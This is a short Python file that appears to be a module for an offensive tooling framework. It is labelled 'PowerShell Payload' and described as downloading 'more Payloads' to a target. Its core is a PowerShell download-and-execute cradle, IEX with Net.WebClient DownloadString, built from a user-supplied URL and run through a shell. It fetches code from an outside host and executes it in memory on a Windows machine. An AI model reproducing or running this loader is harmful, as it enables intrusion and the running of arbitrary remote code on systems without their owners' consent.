import pyfiglet
from collections import OrderedDict
import subprocess

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'PowerShell Payload',
            'Rank':'Good',
            'Platform':'Windows/win32',
            'architectures':'x86/64 bit processors',
            'Description': 'Downloads more Payloads to/ on Target',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('URL', ('', True,'your link')),
           
               
                ])
                }
    def logo(self):
    	title = 'PowerShell Payload'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set URL <your_link> , then run")
   
    def powershell_payload(self,url):
      command = f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
      subprocess.run(command, shell=True)
    
    def execute(self):
        self.logo()
        url = self.info['Options']['URL'][0]
        self.powershell_payload(url)
        
        return f"[+] Downloading payload from {url} ..."
    